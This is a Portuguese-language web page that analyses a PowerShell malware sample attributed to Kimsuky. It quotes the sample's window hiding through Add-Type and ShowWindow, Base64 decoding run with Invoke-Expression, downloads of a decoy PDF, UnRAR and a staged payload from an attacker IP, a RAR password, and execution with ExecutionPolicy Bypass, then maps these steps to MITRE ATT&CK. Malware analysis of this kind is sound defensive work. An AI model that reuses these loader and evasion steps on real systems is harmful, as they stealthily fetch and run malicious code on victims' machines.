<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link rel="stylesheet" href="../../css/css-paper/paper.css">
    <link rel="shortcut icon" href="../../img/favicon.png" type="image/x-icon">
    <title>paper - Análise de malware - Kimsuky (NORTH KOREAN
APT)</title>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/xt256.min.css">
      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/c.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/x86asm.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/php.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/java.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/vbscript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/rust.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/python.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/javascript.min.js"></script>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/bash.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/powershell.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/json.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/yaml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/xml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/htmlbars.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/nginx.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/shell.min.js"></script>
  <script>
      hljs.highlightAll();
    //  hljs.configure({languages: []});
    </script>

</head>

<body>
    <div class="main_container">
        <header class="header_top">
            <div class="left-section">
                <a href="../../a/about.html" class="menu-link">[ 0xAb0ut-Us ]</a>
                <a href="../../c/contribute.html" class="menu-link">[ 0xContribut3 ]</a>
                <a href="../../w/worms.html" class="menu-link">[ 0xW0rms ]</a>
            </div>
            <div class="right-section">
                <span class="glitch-text">0xPwnbuff3r</span>
            </div>

        </header>

        <main class="content">
            <h1 class="pwntitle">Análise de malware - Kimsuky (NORTH
KOREAN APT)</h1>
            <article>
                  <h2 id="sumário">SUMÁRIO</h2>
                  <ol type="1">
                  <li><a href="#1-introdução">Introdução</a></li>
                  <li><a href="#2-análise-técnica">Análise
                  técnica</a><br />
                  2.1. <a href="#21-injeção-de-c-com-add-type">Injeção
                  de C# com Add-Type</a><br />
                  2.2. <a
                  href="#22-ocultação-de-processos-via-showwindow">Ocultação
                  de processos via ShowWindow</a><br />
                  2.3. <a
                  href="#23-ofuscação-base64-e-execução-dinâmica">Ofuscação
                  Base64 e execução dinâmica</a><br />
                  2.4. <a
                  href="#24-pdf-de-distração-e-engenharia-social">PDF de
                  distração e engenharia social</a><br />
                  2.5. <a
                  href="#25-ferramentas-externas-para-extração-de-payload">Ferramentas
                  Externas para Extração de Payload</a><br />
                  2.6. <a
                  href="#26-execução-de-payload-em-múltiplas-etapas">Execução
                  de Payload em Múltiplas Etapas</a><br />
                  2.7. <a
                  href="#27-execução-de-payload-em-múltiplas-etapas">Execução
                  do Script da Etapa Final</a></li>
                  <li><a href="#3-mapeamento-mitre-attck">Mapeamento
                  MITRE ATT&amp;CK</a></li>
                  <li><a href="#4-considerações-finais">Considerações
                  Finais</a></li>
                  </ol>
                  <hr />
                  <h2 id="1-introdução">1. INTRODUÇÃO</h2>
                  <p>APT refere-se a grupos de Ameaça Persistente
                  Avançada (Advanced Persistent Threat), conhecidos por
                  desenvolverem malwares altamente avançados e
                  furtivos.<br />
                  A amostra analisada aqui está categorizada como
                  <strong>APT</strong>, <strong>Kimsuky</strong>, e foi
                  escrita em PowerShell (<code>.ps1</code>), encontrada
                  no Malware Bazaar.</p>
                  <p><strong>Objetivo:</strong> Aprender técnicas
                  avançadas de evasão e encadeamento (staging).</p>
                  <hr />
                  <h2 id="2-análise-técnica">2. ANÁLISE TÉCNICA</h2>
                  <h3 id="21-injeção-de-c-com-add-type">2.1. Injeção de
                  C# com Add-Type</h3>
                  <pre class="powershell"><code>$sd = Add-Type @&quot;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
public class WinHpXN
{
    [DllImport(&quot;user32.dll&quot;)]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    public static void SwMng(int processId, int sw)
    {
        Process process = Process.GetProcessById(processId);
        IntPtr hWnd = process.MainWindowHandle;
        if (hWnd != IntPtr.Zero)
            ShowWindow(hWnd, sw);
    }
}
&quot;@</code></pre>
                  <ul>
                  <li>O script usa <code>Add-Type</code> para injetar e
                  compilar código C# inline.</li>
                  <li>A classe <code>WinHpXN</code> é criada para chamar
                  a função <code>ShowWindow</code> da
                  <code>user32.dll</code>.</li>
                  <li><strong>Propósito</strong>: Ocultar ou exibir
                  janelas de processos específicos.</li>
                  </ul>
                  <p>Valores de <code>sw</code>:</p>
                  <ul>
                  <li>0 = <code>SW_HIDE</code> → ocultar janela</li>
                  <li>5 = <code>SW_SHOW</code> → exibir janela (não
                  utilizado aqui)</li>
                  </ul>
                  <hr />
                  <h3 id="22-ocultação-de-processos-via-showwindow">2.2.
                  Ocultação de processos via ShowWindow</h3>
                  <pre class="powershell"><code>$fd = Get-Process -Name powershell,WindowsTerminal

foreach ($fz in $fd) {
    [WinHpXN]::SwMng($fz.Id, 0)
}</code></pre>
                  <ul>
                  <li>Usa <code>Get-Process</code> para encontrar
                  <code>powershell</code>,
                  <code>WindowsTerminal</code>.</li>
                  <li><strong>Oculta suas interfaces gráficas
                  (GUI)</strong>: evasão visual e furtividade contra
                  analistas ou sandboxes.</li>
                  </ul>
                  <hr />
                  <h3 id="23-ofuscação-base64-e-execução-dinâmica">2.3.
                  Ofuscação Base64 e execução dinâmica</h3>
                  <pre class="powershell"><code>$gvb = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($sd.Replace(&#39;@&#39;, &#39;&#39;)))
iex $gvb</code></pre>
                  <ul>
                  <li>Remove o '@' para contornar a correspondência de
                  padrões de antivírus (AV).</li>
                  <li>Decodifica e executa o código ofuscado via
                  <code>Invoke-Expression</code>.</li>
                  </ul>
                  <blockquote>
                  <p>Este malware veio com <strong>'@'</strong> dentro
                  da ofuscação para evadir a detecção.</p>
                  </blockquote>
                  <hr />
                  <h3 id="24-pdf-de-distração-e-engenharia-social">2.4.
                  PDF de distração e engenharia social</h3>
                  <pre class="powershell"><code>Invoke-WebRequest -Uri &quot;http://92[.]119[.]114[.]128/doc.pdf&quot; -OutFile &quot;$env:TEMP\Distribution Document.pdf&quot;
Start-Process -FilePath &quot;Distribution Document.pdf&quot;</code></pre>
                  <ul>
                  <li>Faz o download e abre um PDF como isca durante a
                  atividade maliciosa.</li>
                  <li><strong>IP criminoso:</strong>
                  <code>92.119.114.128</code></li>
                  </ul>
                  <hr />
                  <h3
                  id="25-ferramentas-externas-para-extração-de-payload">2.5.
                  Ferramentas Externas para Extração de Payload</h3>
                  <pre class="powershell"><code>Invoke-WebRequest -Uri &quot;http://92[.]119[.]114[.]128/Assets/UnRAR.exe&quot;</code></pre>
                  <ul>
                  <li>Faz o download do <code>UnRAR.exe</code> para
                  extrair arquivos <code>.rar</code> protegidos por
                  senha.</li>
                  <li><strong>Evita</strong> o uso do
                  <code>Expand-Archive</code> nativo para evadir a
                  detecção.</li>
                  </ul>
                  <hr />
                  <h3
                  id="26-execução-de-payload-em-múltiplas-etapas">2.6.
                  Execução de Payload em Múltiplas Etapas</h3>
                  <pre class="powershell"><code>cmd.exe /C &quot;$env:TEMP\UnRAR.exe x -ppoiuytrewq1234 -o+ $env:TEMP\orwartde.rar $env:TEMP&quot;
Start-Process -FilePath orwartde.exe</code></pre>
                  <ul>
                  <li>Usa RAR protegido por senha para extrair binários
                  maliciosos.</li>
                  <li>Executa múltiplas etapas (por exemplo,
                  <code>orwartde.exe</code>, <code>enwtsv.exe</code>)
                  para aumentar a persistência.</li>
                  </ul>
                  <hr />
                  <h3 id="27-execução-do-script-da-etapa-final">2.7.
                  Execução do Script da Etapa Final</h3>
                  <pre class="powershell"><code>$t = Invoke-WebRequest ...
$gds = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($t))
Set-Content -Path &quot;$env:TEMP\ov4_dd_pf.txt&quot; -Value $gds
if (Test-Path &quot;$env:TEMP\ov4_dd_pf.ps1&quot;) {
    Remove-Item -Path &quot;$env:TEMP\ov4_dd_pf.ps1&quot; -Force
}
cmd.exe /C &quot;powershell -ExecutionPolicy Bypass -File $env:TEMP\ov4_dd_pf.ps1&quot;</code></pre>
                  <ul>
                  <li>Faz o download de outra carga-útil (Payload) em
                  PowerShell codificada em base64 e a executa.</li>
                  <li>Usa o renomeio de <code>.txt</code> para
                  <code>.ps1</code> para evadir antivírus (AV).</li>
                  <li>Executa utilizando
                  <code>ExecutionPolicy Bypass</code>.</li>
                  </ul>
                  <hr />
                  <h2 id="3-mapeamento-mitre-attck">3. MAPEAMENTO MITRE
                  ATT&amp;CK</h2>
                  <h3 id="defense-evasion">Defense Evasion</h3>
                  <ul>
                  <li><strong><a
                  href="https://attack.mitre.org/techniques/T1027/">T1027</a></strong>
                  Obfuscated Files (Base64)</li>
                  <li><strong><a
                  href="https://attack.mitre.org/techniques/T1027/002/">T1027.002</a></strong>
                  Packed Files (.rar with password)</li>
                  <li><strong><a
                  href="https://attack.mitre.org/techniques/T1218/">T1218</a></strong>
                  Signed Binary Proxy Execution (cmd.exe,
                  Start-Process)</li>
                  <li><strong><a
                  href="https://attack.mitre.org/techniques/T1036/">T1036</a></strong>
                  Masquerading (.ps1 disguised as .txt)</li>
                  <li><strong><a
                  href="https://attack.mitre.org/techniques/T1548/002/">T1548.002</a></strong>
                  Bypass User Account Control (ExecutionPolicy
                  Bypass)</li>
                  </ul>
                  <h3 id="command-and-control">Command and Control</h3>
                  <ul>
                  <li><strong><a
                  href="https://attack.mitre.org/techniques/T1071/001/">T1071.001</a></strong>
                  Application Layer Protocol (HTTP)</li>
                  <li><strong><a
                  href="https://attack.mitre.org/techniques/T1105/">T1105</a></strong>
                  Ingress Tool Transfer (Downloads: .exe, .rar)</li>
                  </ul>
                  <h3 id="discovery">Discovery</h3>
                  <ul>
                  <li><strong><a
                  href="https://attack.mitre.org/techniques/T1057/">T1057</a></strong>
                  Process Discovery (Get-Process to find terminals)</li>
                  </ul>
                  <hr />
                  <h2 id="4-considerações-finais">4. CONSIDERAÇÕES
                  FINAIS</h2>
                  <p>Na minha opinião, conseguimos aprender bastante,
                  especialmente técnicas interessantes de APT que podem
                  ser utilizadas no mundo real.</p>
                  <p><strong>Thx for reading!</strong><br />
                  — <a
                  href="https://www.linkedin.com/in/maiquel-paiva">@untw0</a>
                  :)</p>
            </article>
            
            <a href="/PwnBuffer/index.html" class="back-link">← Voltar para a página principal</a>
        </main>

        <footer class="footer">
            <div class="footer-content">
                <span>&copy; 2025 - pwnbuffer.org </span>
                <span class="footer-separator">|</span>
                <a href="https://www.freebsd.org/" target="_blank" class="footer-link">[ Discord ]</a>
                <span class="footer-separator">|</span>
                <a href="https://github.com/" target="_blank" class="footer-link">[ X ] </a>
        </footer>
    </div>

</body>
<script>
    document.addEventListener("DOMContentLoaded", () => {
        const els = document.querySelectorAll(".glitch-text, .pwntitle");
        const chars = "\u0025\u0023\u0024\u0040\u005E\u0026\u002A\u0021\u003F\u003C\u002D\u003E\u002B\u007C\u002A";

        els.forEach(el => {
            const originalText = el.textContent;

            function glitchEffect() {
                let iterations = 0;
                const interval = setInterval(() => {
                    el.textContent = originalText
                        .split("")
                        .map((letter, index) => {
                            if (index < iterations) {
                                return originalText[index];
                            }
                            return chars[Math.floor(Math.random() * chars.length)];
                        })
                        .join("");

                    iterations += 1 / 2;

                    if (iterations >= originalText.length) {
                        clearInterval(interval);
                        el.textContent = originalText;
                    }
                }, 50);
            }

            setInterval(glitchEffect, 12000);
        });
    });
</script>

</html>
